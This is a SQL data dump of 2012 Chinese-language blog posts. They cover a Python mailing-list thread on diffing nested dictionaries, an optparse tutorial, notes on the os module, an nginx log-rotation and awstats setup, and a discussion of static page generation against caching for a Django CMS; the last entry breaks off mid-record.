	('a68e26ac9b5a41c2b609c71f41a9f743', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, '有没有什么办法检查两个字典树有什么区别？', 'CPyUG', NULL, '\n\n-------------------\n发件人： esbat \n日期： 2012年7月19日 下午1:19\n收件人： python-cn@googlegroups.com\n\n\n问题一：\n\n    字典a：{\' \'a1\': \'b1\', \'a2\': {\'b2\': \'c2\'}, \'a3\': \'b3\'}\n    字典b：{\' \'a1\': \'b1\', \'a2\': {\'b2\': \'c3\'}}\n\n有没有什么第三方库，可以给出字典树a和b的区别，\n比如给出结构区别，b缺少‘a3\'子树；给出值的区别，字典a值为a2，而b变成了a3。\n\n问题二：\n有没有什么办法比较两个类似的json，给出树和值的区别？\n\n问题三：\n有没有什么办法比较两个类似的xml，给出树和值的区别？\n\n----------\n发件人： lee Alexander \n日期： 2012年7月19日 下午1:23\n收件人： python-cn@googlegroups.com\n\n树型展开成str后diff？\n\n----------\n发件人： Chenglong Chen \n日期： 2012年7月19日 下午1:26\n收件人： python-cn@googlegroups.com\n\n有序的阿。同时遍历2个tree就行\n\n----------\n发件人： Wang Xuerui \n日期： 2012年7月19日 下午1:27\n收件人： python-cn@googlegroups.com\n\n既然是树，就用递归算法。。。。\n\n- 比较根节点的孩子集合（交，差）\n  - 如果是叶子，比较值的集合\n- 对双方孩子的交集，执行这个比较算法\n\n----------\n发件人： esbat\n日期： 2012年7月19日 下午1:29\n收件人： python-cn@googlegroups.com\n\n\n我是用递归算法实现的，但是我觉得我的三个问题应该是通用问题，应该有人造过这个轮子\n\n\n----------\n发件人： Wang Xuerui \n日期： 2012年7月19日 下午1:33\n收件人： python-cn@googlegroups.com\n\n这是什么应用场景下的问题？问题通用是不假。。。。\n\n这么一说我倒想起了diff...\n把两个结构pretty-print(可用pprint模块,总之是要保证key有序),然后纯文本diff...\n如果结果是给人看的话,这样估计够了\n\n如果是其他算法的输入的话, 还是递归吧= =\n\n----------\n发件人： Xunzhen Quan \n日期： 2012年7月19日 下午1:41\n收件人： python-cn@googlegroups.com\n\n我是用递归算法实现的，但是我觉得我的三个问题应该是通用问题，应该有人造过这个轮子\n\n这个东西又不复杂，又不是很难写，需求变化又大，我觉得应该没什么必要把这个部分独立出来……\n\n----------\n发件人： esbat \n日期： 2012年7月19日 下午1:51\n收件人： python-cn@googlegroups.com\n\n\n我觉得我的问题二和问题三 是通用需求 不是什么会变化很大的东西。真的没有这样的三方库么？ 每个人比较字典树 都是自己搞？\n\n----------\nFrom: greatghoul\nDate: 2012/7/19\nTo: python-cn@googlegroups.com\n\n\nphp 和 js 倒是有这样的第三方库，可是python的很少\n\nhttp://tlrobinson.net/projects/javascript-fun/jsondiff/\nhttp://stackoverflow.com/questions/3123645/diffing-a-json-document\nhttps://github.com/jclulow/jsondiff\n\n这个python版的不知道效果肿么样，lz自己研究吧\nhttps://github.com/talos/json_diff\n\n----------\n发件人： limodou \n日期： 2012年7月19日 下午2:25\n收件人： python-cn@googlegroups.com\n\n如果数据相对简单，比如都是同一种类型的，可以考虑先生成两个列表，然后使用集合方式来比较，列表的每项是象路径一样的格式，如， (key1, key2), value1，我写了一个简单的代码如下：\n\n    #! /usr/bin/env python\n    #coding=utf-8\n    a = {\'a1\': \'b1\', \'a2\': {\'b2\': \'c2\'}, \'a3\': \'b3\'}\n    b = {\'a1\': \'b1\', \'a2\': {\'b2\': \'c3\'}}\n\n    def p(x, root=None):\n        for k, v in x.items():\n            if isinstance(v, dict):\n                for t in p(v, k):\n                    yield t\n            else:\n                if root:\n                    yield ((root, k), v)\n                else:\n                    yield (k, v)\n\n    a1 = set([x for x in p(a)])\n    b1 = set([x for x in p(b)])\n\n    print a1\n    print b1\n    print a1^b1\n\n供参考\n\n----------\n发件人： garcheck \n日期： 2012年7月19日 下午2:41\n收件人： python-cn@googlegroups.com\n\n\n前段时间正好有个类似的需求, 写了一个脚本. 里面看看没什么业务逻辑, 就拿出来晒晒亮丑了.\n\n因为部分内容跟业务相关, 实现的有些啰嗦. 楼主大概照着理解理解意思吧.. XML的应该有类似的库吧~类似与difflib的不行么\n\n    #coding:utf-8\n\n    import re\n    from UserList import UserList\n\n    class StructNotFound(Exception):\n        pass\n        \n    INDEX_PATTERN = re.compile(r\'^(\\w+)\\[(\\d+)\\]$\') # 索引表示\n\n    def _safe_sp_encode(subpath):\n        subpath = subpath.replace(\'.\', \'#dot#\')\n        subpath = subpath.replace(\'[\', \'#lftbra#\')\n        subpath = subpath.replace(\']\', \'#rgtbra#\')\n        return subpath\n\n    def _safe_sp_decode(subpath):\n        subpath = subpath.replace(\'#dot#\', \'.\')\n        subpath = subpath.replace(\'#lftbra#\', \'[\')\n        subpath = subpath.replace(\'#rgtbra#\', \']\')\n        return subpath\n\n    def get_all_path(struct):\n        """ 得到一个结构体的所有路径. 如结构体:\n            {\'a\': {\n                \'aa\': [\'aa1\', {\'aa2a\': \'1\'}],\n                \'ab\': 2,\n                \'ac\': {\n                    \'aca\': 1,\n                    \'acb\': 2\n                    }\n                }\n              \'b\': [1,2]\n            }\n            then 所有路径如下:\n            a.aa[0], \'aa1\'\n            a.aa[1].aa2a, \'1\'\n            a.ab, 2\n            a.ac.aca, 1\n            a.ac.acb, 2\n            b[0], 1\n            b[1], 2\n        """\n        stack = [(\'\', struct)]\n        pathlist = []\n        while 1:\n            if not stack:\n                break\n            path, st = stack.pop()\n            if isinstance(st, dict):\n                stack += [("%s.%s"%(path, _safe_sp_encode(k)) if path else _safe_sp_encode(k), v) for k, v in st.items()]\n            elif isinstance(st, (list, tuple)):\n                stack += [("%s[%s]"%(path, i), v) for i, v in enumerate(st)]\n            else:\n                pathlist.append((path, st)) \n        return pathlist\n\n    def get_struct(struct_dict, path):\n        """ 根据提供的路径, 得到一个子结构体.\n        """\n        item = struct_dict\n        for i, p in enumerate(path.split(\'.\')):\n            p = _safe_sp_decode(p)\n            if not isinstance(item, dict):\n                raise StructNotFound\n            match = INDEX_PATTERN.match(p)\n            if match:\n                subp, index = match.groups()\n                if subp not in item:\n                    raise StructNotFound\n                item = item[subp]\n                index = int(index)\n                if not isinstance(item, (tuple, list)) or index >= len(item):\n                    raise StructNotFound\n                item = item[index]\n            else:\n                if p not in item: \n                    raise StructNotFound\n                item = item[p]\n        return item\n\n    class CheckCollection(UserList):\n        NOT_FOUND = 1 # 没有在实际结果中发现该数据\n        NOT_EQUAL = 2 # 数据不想等\n        UNEXPECTED = 3 # 没有在期望结果中发现该数据  \n        def add_error(self, path, error_type, data=None):\n            self.append((path, error_type, data))\n            \n        def add_errors(self, errors):\n            for error in errors:\n                self.add_error(*error)\n        \n    def check_struct(actual_dict, expected_dict, strict=False):\n        """ 测试结构体是否一致.\n            @param actual_dict: 实际值的结构体\n            @param expected_dict: 期望值的结构体\n            @param strict: 是否完全比对. 如果为False, 只检查期望值中已有的值,\n                if True, 会包括检查实际值有但期望值没有的值.\n            @return: 三元组列表. 每个元组 [0]代表 元素路径, [1]代表错误码,\n                    [2]代表具体数据.\n        """\n        actual_paths = dict(get_all_path(actual_dict))\n        expected_paths = dict(get_all_path(expected_dict))\n        checks = CheckCollection()\n        for path, value in expected_paths.items():\n            if path not in actual_paths:\n                checks.add_error(path, checks.NOT_FOUND)\n            elif value is not None:\n                actual_value = actual_paths.pop(path)\n                if value != actual_value:\n                    checks.add_error(path, checks.NOT_EQUAL, (value, actual_value))\n        if strict:\n            for path in actual_paths:\n                checks.add_error(path, checks.UNEXPECTED)\n        return checks\n\n\n    def check_path(struct_dict, path, value=None):\n        """ 根据路径测试结构体中的值是否正确.\n        """\n        checks = CheckCollection()\n        try:\n            item = get_struct(struct_dict, path)\n            if value is None:\n                return\n            elif not isinstance(value, dict):\n                if value != item:\n                    checks.add_error(path, checks.NOT_EQUAL, (value, item))\n            else:\n                checks.add_errors(check_struct(item, value, True))\n        except StructNotFound:\n            checks.add_error(path, checks.NOT_FOUND)\n        return checks\n        \n\n    _INDEX_PREFIX_PATTERN = re.compile(r\'^\\[\\d+\\]\')            \n    def check_struct_from_paths(actual_dict, expected_dict, pathlist=None):\n        if pathlist is None:\n            return check_struct(actual_dict, expected_dict, True)\n        checks = CheckCollection()\n        for path in pathlist:\n            try:\n                acutal_sub = get_struct(actual_dict, path)\n            except StructNotFound:\n                checks.add_error(path, checks.NOT_FOUND)\n                continue\n            try:\n                expected_sub = get_struct(expected_dict, path)\n            except StructNotFound:\n                checks.add_error(path, checks.UNEXPECTED)\n                continue\n            errors = check_struct(acutal_sub, expected_sub, True)\n            for error in errors:\n                p = path + error[0] if _INDEX_PREFIX_PATTERN.match(error[0]) else path + (error[0] and ".%s"%error[0])\n                checks.add_error(p, error[1], error[2])\n        return checks\n\n\n    if __name__ == \'__main__\':\n        d = {\n             \'a.c\': [1,23,9],\n             \'b\' : {\n                    \'c\': 1,\n                    \'d\': [{\'f\':1},2,34,],\n                    \'e\': {\'q\': 4}\n            },\n             \'o\': 0,\n        }  \n        \n        d1 = {\n             \'a.c\': [1,23,4],\n             \'b\' : {\n                    \'c\': 3,\n                    \'d\': [{\'f\':1},2,34,],\n                    \'e\': {\'q\': 5}\n            },\n              \'q\': 888,\n        }   \n        for i in check_struct(d, d1):\n            print i, len(i)\n        print \n        for i in check_struct_from_paths(d, d1, [\'a#dot#c\', \'b.c\']):\n            print i, len(i)\n\n', 1, 18, 7, '2012-07-21 21:39:37', '2012-07-21 21:39:37', 'sublime text 2'),
	('b28d6823494e4aef931abf37ff9e82ef', '4e84ce1b8a5247bb8a6179959438b55f', '3', NULL, 'python OptionParser -- 处理选项', 'python', NULL, '@content:\n    #!/usr/bin/python\n    from optparse import OptionParser\n\n    parser = OptionParser()\n    parser.add_option("-f", "--file", dest="filename",\n                      help="write report to FILE", metavar="FILE")\n    parser.add_option("-q", "--quiet",\n                      action="store_false", dest="verbose", default=True,\n                      help="don\'t print status messages to stdout")\n\n    (options, args) = parser.parse_args()\n\n    print options.filename,options.verbose    \n\n*********************************************************************\n\n将上面代码保存到文件option1.py(名字随便),添加执行权限并运行:\n\n    ./option1.py\n    ./option1.py -f\n    ./option1.py -f foo.txt\n    ./option1.py -f foo.txt -q\n    ./option1.py -qffoo.txt # 注意这个和下面对比\n    ./option1.py -fqfoo.txt\n    ./option1.py --file foo.txt\n    ./option1.py --quiet\n    ./option1.py -h   # -h和--help默认情况optpars自动处理。\n    ./option1.py --help\n\n查看输出结果，稍稍思考就有所的了。\n加载模块要使用OptionParser模块，需要在Python程序中导入：\n\n    from optparse import OptionParser\n\n生成OptionParser实例首先需要生成一个实例，以后的操作都是操作这个实例，相当于分配了一段内存空 间。不然无处可以操作，类似C中的结构说明。不过Python是面向”对象“的语言。对 象的属性比结构多很多，可操作性更强，后面我们会介绍在生成OptionParser对象 的时候可以传递的一些参数。\n\n    usage = "usage: %prog [options] arg" # 定义字符串\n    parser = OptionParser(usage) # 传递一个字符串参数\n\nOptionParser不要求一定要传递参数，不过传递一些参数，可以方便程序使用。\n\n    OptionParser(usage="%prog [-f] [-g]",version="%prog 1.0")\n    # %prog 在这里会自动替换为程序名字\n    # usage 可以打印用法\n    # version 在使用 %prog --version 的时候输出版本信息\n\n使用add_option添加命令行参数\n\n    parser.add_option("-f", "--file", dest="filename",\n                      help="read data from FILENAME")\n    parser.add_option("-v", "--verbose",\n                      action="store_true", dest="verbose")\n    parser.add_option("-q", "--quiet",\n                      action="store_false", dest="verbose")\n\n最后调用parse_args()解析命令行参数\n\n    (options, args) = parser.parse_args()\n\n可以传递一个参数列表给parse_args()，否则，默认使用命令行参数 (sys.argv[1:])。parse_args()返回两个值：\n\n    * options , 这是一个对象(optpars.Values)，保存有命令行参数值。只要知道 命令行参数名,如file，就可以访问其对应的值：options.file。\n    * args , 一个由 positional arguments 组成的列表\n\nparse_args()方法的参数actionaction是parse_args()方法的参数之一,指示optparser解析参数时候该如何处理。 action有一组固定的值可以选择，默认是\'store\'，表是将命令行参数值保存到 options对象里。\n\n    parser.add_option("-f","--file",\n                      action="store",type="string",dest="filename")\n    args=["-f","foo.txt"]\n    (options,args)=parser.parse_args(args)\n    print options.filename\n\n上面程序会输出"foo.txt"\naction的值有：store,store_true,store_false,store_const,append,count,callback.\ntypetype的默认值是"string"，也可以是"int""float"等。\ndest如果没有指定dest参数，将用命令行的参数名来对options对象的值进行存取。\nstore的形式store可以为 store_true 和 store_false 两种形式。用于处理命令行参数后面不 带值的情况。如 -v, -q 等命令行参数：\n\n    parser.add_option("-v",action="store_true",dest="verbose")\n    parser.add_option("-q",action="store_false",dest="verbose")\n\n当解析到 -v ，options.verbose值为True，解析到 -q , 值为 False。注意，这里 顺序解析，所以如果有 -vq，最终的值还是False。\ndefault — 设置默认值\n\n    parser.add_option("-f","--file",\n                       action="store",\n                       dest="filename",\n                       default="foo.txt")\n    parser.add_option("-v",\n                       action="store_true",\n                       dest="verbose",\n                       default=True)\n\nhelp — 指定帮助文档\n\n    parser.add_option("-f", "--filename",\n                      metavar="FILE",\n                      help="write output to FILE"),\n\noptparse解析到 -h 或者 —help 命令行参数时，调用 parser.print_help()输出 程序帮助信息。help字段很有用。\n\nmetavar — 提示用户期望参数Group — 给参数分组\n\n    group = OptionGroup(parser, ``Dangerous Options",\n                        ``Caution: use these options at your own risk."\n                        ``It is believed that some of them bite.")\n    group.add_option(``-g", action="store_true", help="Group option.")\n    parser.add_option_group(group)\n\n', 1, 33, 4, '2012-07-12 00:03:46', '2012-07-12 00:03:46', 'sublime text 2'),
	('b9d9029b8d9244e683a2ce42f2bc896e', '4e84ce1b8a5247bb8a6179959438b55f', '3', NULL, 'Python模块——os', 'python', NULL, '\nos.sep 可以取代操作系统特定的路径分割符。\n \nos.name字符串指示你正在使用的平台。比如对于Windows，它是\'nt\'，而对于Linux/Unix用户，它是\'posix\'。\n \nos.getcwd()函数得到当前工作目录，即当前Python脚本工作的目录路径。\n \nos.getenv()和os.putenv()函数分别用来读取和设置环境变量。\n \nos.listdir()返回指定目录下的所有文件和目录名。\n \nos.curdir:返回当前目录（\'.\')\n \nos.remove()函数用来删除一个文件。\n \nos.system()函数用来运行shell命令。\n \nos.chdir(dirname):改变工作目录到dirname\n \nos.linesep字符串给出当前平台使用的行终止符。例如，Windows使用\'\\r\\n\'，Linux使用\'\\n\'而Mac使用\'\\r\'。\n \nos.path.isdir(name):判断name是不是一个目录，name不是目录就返回false\n \nos.path.isfile(name):判断name是不是一个文件，不存在name也返回false\n \nos.path.exists(name):判断是否存在文件或目录name\n \nos.path.getsize(name):获得文件大小，如果name是目录返回0L\n \nos.path.abspath(name):获得绝对路径\n \nos.path.normpath(path):规范path字符串形式\n \nos.path.split(name):分割文件名与目录（事实上，如果你完全使用目录，它也会将最后一个目录作为文件名而分离，同时它不会判断文件或目录是否存在）\n \nos.path.splitext():分离文件名与扩展名\n \nos.path.join(path,name):连接目录与文件名或目录\n \nos.path.basename(path):返回文件名\n \nos.path.dirname(path):返回文件路径\n', 1, 26, 8, '2012-07-12 00:45:20', '2012-07-12 00:45:20', 'sublime text 2'),
	('c235d366ee9344bcb85c3d84536e6c33', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'awstats+nginx日志分析', 'awstats,nginx', NULL, '\n\n### 第一步,日志的处理。\n\n每天分割一下日志，首先把日志文件复制到别的地方，然后再通知nginx重新生成日志就可以了。shell脚本如下：\n\n    #!/bin/bash\n    logs_path="/usr/local/nginx/logs/"\n    mv ${logs_path}access.log ${logs_path}access_$(date -d "yesterday" +"%Y%m%d").log\n    kill -USR1 `cat /usr/local/nginx/logs/nginx.pid`        \n\n代码中的/nginx/logs指的是nginx的log日志文件所在目录，生成了以昨天日期命名的日志文件。\n为了达到每天自动分割的目的，在crontab中加入以下部分：\n\n    1 0 * * * sh /usr/local/nginx/sbin/cut_nginx_log.sh\n\n这样就每天的0点1分把nginx日志重命名为日期格式，并重新生成今天的新日志文件。\n\n### 第二步,Awstats的配置。\n\n日志文件分割好了，接下来就是分析了，也就是Awstats的使用了。\nAwstats的配置文件默认会存储在/etc/awstats/目录下，包括你安装时设置的域名如：awstats.www.demo.com.conf。在这个配置文件中修改这个地方：\n\n    LogFile="/nginx/logs/access_%YYYY-0%MM-0%DD-24.log"\n\n这个意思是要去读取nginx昨天的日志文件，关于后边%YYYY-0%MM-0%DD-24的设置，规则如下：\n\n    # You can also use tags in this filename if you need a dynamic file name\n    # of its execution). This is available tags :\n    #   %YYYY-n  is replaced with 4 digits year we were n hours ago\n    #   %YY-n    is replaced with 2 digits year we were n hours ago\n    #   %MM-n    is replaced with 2 digits month we were n hours ago\n    #   %MO-n    is replaced with 3 letters month we were n hours ago\n    #   %HH-n    is replaced with hour we were n hours ago\n    #   %NS-n    is replaced with number of seconds at 00:00 since 1970\n    #   %WM-n    is replaced with the week number in month (1-5)\n    #   %Wm-n    is replaced with the week number in month (0-4)\n    #   %WY-n    is replaced with the week number in year (01-52)\n    #   %Wy-n    is replaced with the week number in year (00-51)\n    #   %DW-n    is replaced with the day number in week (1-7, 1=sunday)\n    #                              use n=24 if you need (1-7, 1=monday)\n    #   %Dw-n    is replaced with the day number in week (0-6, 0=sunday)\n    #                              use n=24 if you need (0-6, 0=monday)\n    #   Use 0 for n if you need current year, month, day, hour\n\n### 第三步,开始分析、生成结果。\n\n最后，可以执行分析了。使用这个命令：\n下面的命令来生成html页面：\n\n\n    perl /usr/local/awstats/tools/awstats_buildstaticpages.pl -update \\\n     -config=www.demo.com -lang=cn \\\n    -dir=/usr/local/nginx/html/awstats \\\n    -awstatsprog=/usr/local/awstats/wwwroot/cgi-bin/awstats.pl\n\n这样就会在/html/awstats目录下生成分析结果页，。\n\n### 第四步,自动化。\n\n    1 0 * * * sh /home/zyf/sh/cut_nginx_log.sh\n\n    0 2 * * * perl /usr/local/awstats/tools/awstats_buildstaticpages.pl -update -config=www.demo.com -lang=cn -dir=/usr/local/nginx/html/awstats -awstatsprog=/usr/local/awstats/wwwroot/cgi-bin/awstats.pl\n', 1, 23, 6, '2012-07-13 23:02:56', '2012-07-13 23:02:56', 'sublime text 2'),
	('c39a89bfa36a477c9e357e6882233985', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, '有关于CMS的疑问，部署时是否生成静态页面有更好的优势？', 'CPyUG', NULL, '\n\n发件人： yang xiaoyong \n日期： 2012年7月17日 下午10:22\n收件人： python-cn@googlegroups.com\n\n\nHi all,\n\n大家好，目前遇到几个问题，现在单独开发一个CMS系统（基于Django），今天跟技术总监，运维人员和市场部同事讨论部署的时候，他们偏向于将CMS动态生成的内容静态化，也就是每个页面都单独生成html文件，然后使用nginx来直接处理这些静态内容，理由如下\n\n1. 静态生成的页面效率方面有保证，nginx直接读取文件系统，可靠性和稳定性高，而且nginx也证明了确实在处理静态内容方面有很大的优势\n2. 有利于SEO优化（针对国内一般都是指百度），我最不明白的是这点，甚至技术总监和市场部都要求url的slug都必须要有.html结尾，针对这点我google百度了很久，也没有找到一个可靠的说法，如果我有遗漏，烦请哪位SEO达人能指点我一下（因为是CMS系统，所以SEO的比重比较大，吸引流量和用户才是这个站点的关键）\n3. 有很多权威网站是这么干的（利用CMS系统生成html静态文件）网易，xxx, xxx 然后我就不说了，这点我无力吐槽，因为这是我第一个web项目，所知道的也甚少。\n\n其实这个论点不是技术上如何生成静态内容文件的问题，我所不能理解的是以上三点。\n\n1. 我用memcached控制缓存的效率难道不高于直接读取文件系统的效率吗？\n2. 关于url必须要有.html这种东西有助于SEO优化，实在是很难理解\n3. 好吧，成功网站都这么干，说明有什么原因和经验可以分享\n\n我也所能理解如果生成静态内容文件的话，简单，也能减轻后台程序的压力（后台只做索引，标签管理，等一些必须动态页面的生成）\n\n只是上面三个疑惑一直困扰着我，还希望群里的大牛们能解解我的惑\n\n提前谢谢！\n  \n\n发件人： Wang Xuerui \n日期： 2012年7月17日 下午10:39\n收件人： python-cn@googlegroups.com\n\n首先声明鄙人算不上大牛，观点正确性不能保证。。。。。\n\n内核文件描述符可用sendfile()系统调用实现zero-copy网络操作。。性能是挺高的=\n=memcache是用户态的缓存，操作系统的文件系统缓存则是内核管辖。反正内存够大的话请求最后不会读到硬盘就是了。重负载的情况下还是静态文件比较好吧我觉得...\n\n不过说到性能瓶颈，国内环境的话倒是会首先受制于客户端的网络带宽吧。。\n\n> 2. 关于url必须要有.html这种东西有助于SEO优化，实在是很难理解\n现在这个rewrite横行的年代，URL的长相和页面生成方法根本就是两个毫不相关的东西。。后缀这种东西直接就在stem的时候被无视了吧估计=\n=如果url有.html就一定能提升ranking的话，大家早就这么做了\n\n----------\n发件人： lee Alexander \n日期： 2012年7月17日 下午10:49\n收件人： python-cn@googlegroups.com\n\n\n既然生成了静态网页，后缀必然是html或者htm，难不成你想存成啥怪异的后缀？\n静态化绝对性能有提成，未经优化的nginx处理静态内容可以很轻松的达到上w/s的处理能力。但是就算python的app server里还算快的tornado来说，4个进程空载跑都最多到8K，还不说多个取memcache的开销了。怎么可能比nginx处理静态文件快呢？\n\n一切用数据说话，别动不动就吐槽无力。\n\n静态化光性能一项已经够理由这么干了\n\n\n----------\n发件人： 机械唯物主义 : linjunhalida \n日期： 2012年7月17日 下午10:59\n收件人： python-cn@googlegroups.com\n\n\n我也支持静态化， 不过需要注意的是页面是否含有动态内容， 比如用户登录？ 如果因此选择用js更新， 带来的复杂度可能得不偿失。\n具体还是看用户的级别， 如果是内部系统， 怎么弄都可以， 产品级别的话， 静态化可以尝试。\n\n然后html后缀可以用nginx来去掉。 我的博客现在是这样的。采用middleman静态生成页面。\nhttp://blog.linjunhalida.com/article/pyside%E4%BB%8B%E7%BB%8D\n\n至于html后缀， 重来没有听说过这样的说法。 可以问一下baidu的同学， 有什么特殊的。\n\n\n----------\n发件人： jaxiinofea \n日期： 2012年7月17日 下午11:01\n收件人： python-cn@googlegroups.com\n\n\n1.测试一下嘛，有数据才有可比性。。  \n2&3.我不懂SEO优化，所以以下皆屁话。。大网站url不以html结尾的貌似比比皆是。 url以html、shtml、php、py结尾有区别的么？\n\n\n----------\n发件人： yang xiaoyong \n日期： 2012年7月17日 下午11:04\n收件人： python-cn@googlegroups.com\n\n\n嗯，确实这都需要数据支撑，也没过多的吐槽无力，总之也是有许多不明白，就上来问问了 :D\n\n非常感谢楼上二位的认真回答，有所理解。\n\n再次感谢 :D\n\n----------\n发件人： yang xiaoyong \n日期： 2012年7月17日 下午11:17\n收件人： python-cn@googlegroups.com\n\n\n动态内容，比如搜索，用户管理，标签管理，这部分还是会依赖后台程序来做，网站大部分页面，首页，分类页，详细页可以静态化。\n\n目前已经确定这样做。\n\n再次感谢楼上几位大牛的回答，谢谢！确实学到不少东西。\n\n\n----------\n发件人： alexliyu2012 \n日期： 2012年7月18日 上午12:09\n收件人： python-cn@googlegroups.com\n\n\n同学，难道你不知道nginx很重要的\n一个应用就是均衡负载前端？\n\n你可以后端该怎么做就怎么做\n\nnginx配置\nproxy_cache+rewrite\n多个upstream backend_server\n\n这样伪静态页面也有了\n（seo一样的效果）\n均衡负载也有了\n而且页面\n存储在内存cache中\n（自己proxy_cache设置使用内存/硬盘大小）\n速度不比需要io操作的更好？\n\n----------\n发件人： yang xiaoyong \n日期： 2012年7月18日 上午1:55\n收件人： python-cn@googlegroups.com\n\n\n很感谢  李昱 的回复，但好像你回答的跟我提问的不是很关联的上。 :( anyway, 依然谢谢你热心的回答。\n\n----------\n发件人： 刘鑫 \n日期： 2012年7月18日 上午5:24\n收件人： python-cn@googlegroups.com\n\n\n其实静态化的策略总的来说是对的，不过你说memcache来保存也有道理，memcache本身是10w/s的级别。不过这货很有点不让人踏实。如果你确认你的架构在多种memcache客户端混合访问时不会出错，可以这样的结构：python生成静态内容，nginx memcache客户端（类似这种 http://wiki.nginx.org/HttpMemcModule）来读。\n不过，还是写文件来的简单啊……memcache的话，还有很多细节问题要解决呢……\n\n\n----------\n发件人： @@ \n日期： 2012年7月18日 上午8:48\n收件人： python-cn@googlegroups.com\n\n\n生成html静态文件很多年前就很多网站这么干了。。\n最初url rewrite 之类的都不成熟，生成静态页面确实更seo friendly 否则都是 ?xxx=ooo 之类的url了 。另外静态化后效率肯定会高些。\n\n对于你们这个cms：\n1、性能如果不是问题的话，静态不静态我觉得问题不大。\n2、django已经非常seo friendly了。  /XXX 结尾和 /XXX.HTML 应该是没有区别的。。你们那也是不确定（当然不是Google baidu出来的 谁也不确定）所以觉得html总不会更差吧。\n\n----------\n发件人： lee Alexander\n日期： 2012年7月18日 上午9:17\n收件人： python-cn@googlegroups.com\n\n\n对了，昨晚正好用百度统计的seo检测工具试了试，/xxx 结尾和 /xxx.html 是没有区别的\n\n\n----------\n发件人： Forrest Liu\n日期： 2012年7月18日 上午9:26\n收件人： python-cn@googlegroups.com\n\n\n曾经也遇到过非得在动态页面加上html后缀的...当初同样不解，现在仍然无法理解\n话说回来cms这玩意儿用django自己写还真不如用用PHP的帝国，织梦什么的\n\n----------\n发件人： yang xiaoyong \n日期： 2012年7月18日 上午9:55\n收件人： python-cn@googlegroups.com\n\n\nPHP 个人不是很喜欢，曾经有写过一段时间的PHP，各种的不适应，也不打算去适应，个人问题。\n\n----------\n发件人： beck917 \n日期： 2012年7月18日 上午10:42\n收件人： python-cn@googlegroups.com\n\n\nmemcache虽快,但是动态语言脚本很慢\n\nhtml只是文本文件,不需要服务器做任何解释,所以很快的\n\n----------\n发件人： lee Alexander \n日期： 2012年7月18日 上午10:51\n收件人： python-cn@googlegroups.com\n\n\nlinux下的文件用sendfile不会比再多一次网络开销的memcache慢的\n\n\n----------\n发件人： Wang Xuerui \n日期： 2012年7月18日 上午11:02\n收件人： python-cn@googlegroups.com\n\nsendfile是系统调用，每个chunk\n2次上下文切换，开销上肯定比需要nginx/memcached两个进程配合的memcache小，这个应该没有疑问的...\n\n如果lz不喜欢html后缀，那就rewrite掉，这个在http总的开销里面应该也不大。\n\n----------\n发件人： Shell Xu \n日期： 2012年7月18日 下午6:46\n收件人： python-cn@googlegroups.com\n\n\n如果想用mc，可以用nginx模块。不从磁盘取文件，而是从mc，速度更快。\n但是nginx只管读，写入和超时自己控制。\n\n\n----------\n发件人： 刘鑫 \n日期： 2012年7月18日 下午8:25\n收件人： python-cn@googlegroups.com\n\nsendfile是系统调用，每个chunk\n2次上下文切换，开销上肯定比需要nginx/memcached两个进程配合的memcache小，这个应该没有疑问的...\n\n其实应该这么估算：\n性能：\n  文件 ****\n  memcache **\n拉风程度：\n  文件 ***\n  memcache *****\n可靠性:\n  文件 *****\n  memcache *\n\n还是文件系统比较好…… \n\n如果lz不喜欢html后缀，那就rewrite掉，这个在http总的开销里面应该也不大。\n\n----------\n发件人： Shell Xu \n日期： 2012年7月18日 下午8:56\n收件人： python-cn@googlegroups.com\n\n还是有一种情况mc占优的。\n总数据条数比上会被看到的数据条数实在太高。。。\n\n\n----------\n发件人： alexliyu2012 \n日期： 2012年7月18日 下午11:29\n收件人： python-cn@googlegroups.com\n\n\n你没有理解我的意思，也有可能是我说的不是很清楚，我详细的在解释下我的意思：\n1、现在的大型网站很少是由cms或者说网站系统直接生成静态html页面的，主要是网站需要改版或者需要更改页面的某部分的时候比较麻烦。\n2、我说的形式就是现在很多大型网站使用的，也就是后台实际的cms系统运行1个或多个实例，在一台或多台服务器上。然后有一个前端服务器（比如nginx），访问者访问一个静态页面（实际上是rewirte的静态页面），nginx使用比如proxy_cache之类的缓存代理，用户访问的页面会首先在缓存代理里面命中缓存，如果命中，则返回缓存的页面，如果没有命中，则前段服务器（nginx）根据配置访问CMS具体的实例，返回页面并缓存。\n3、这样的构架好处是显而易见的，首先，访问频率高的页面都会在内存中缓存，而其他的页面也会缓存成静态文件（具体看设置了，比如设置内存500mb缓存，硬盘100g缓存）。这样每次访问时候，返回速度快，而且不用频繁的访问CMS，我想这就达到了你所说的效率问题。\n4、页面实际上是rewirte的，那么自然对于搜索引擎来说，seo也和直接生成静态页面一样的。\n5、此外，比如使用proxy_cache之类的缓存代理，你都可以通过代码来直接控制缓存的刷新释放，而且还可以通过正则表达式来指定那些url缓存，那些不缓存，缓存时间多少，等等的。\n这样的话，也便于实现网站本身的交互应用。比如一个热门列表，就可以控制缓存一个小时刷新一次，比如静态页面，就可以控制静态页面24小时刷新一次缓存。比如用户评论了，就可以直接控制proxy_cache刷新这个页面的缓存。。。等等的。。。这不比你直接全部生成静态页面好？\n6、全部生成静态页面这玩意，7-8年前大家为了提高速度、增强seo、减少服务器负载等等的，一直应用。但是实际上，现在的技术成熟了，为什么还要考虑这个呢？特别是现在的网站更加注重用户体验和交互性，纯静态页面，显然不符合要求了。。。\n\n----------\n发件人： yang xiaoyong \n日期： 2012年7月19日 上午9:49\n收件人： python-cn@googlegroups.com\n\n\n再次感谢  李昱 童鞋的热心回答，首先，可以确定的是，我最初的想法是跟你一致的，经过跟大家的讨论也明白了为什么用静态文件的理由\n\n我决定还是做二套（反正技术层面上也不是很麻烦，只是在 Django 层多加一个中间件专门用来生成静态文件就好了）测试对比下，毕竟用数据说话还是比较靠谱.\n\n:D\n\n----------\n发件人： 源泉星火(张明源) \n日期： 2012年7月19日 下午5:27\n收件人： python-cn@googlegroups.com\n\n\n用cache要小心第一次并发被击垮，除此之外性能差距很小(cache到本地内存/文件系统的话其实和生成静态没啥区别了)\n生成静态的话则需要有些蛋疼的"生成一下"。\n\n----------\n发件人： piglei \n日期： 2012年7月19日 下午6:47\n收件人： python-cn@googlegroups.com\n\n\n我觉得虽然静态相比cache有性能和稳定性的好处，但我更倾向于使用cache，因为批量维护一堆静态是在是很麻烦，\n而且现在的网站很少一整个页面都是静态内容，如果用html文件那用户登陆状态一堆东西全得用js来弄，实在麻烦\n对于cache需要预热的的问题，干脆让它不过期，每次都主动去更新好了。\n\n\n----------\n发件人： lee 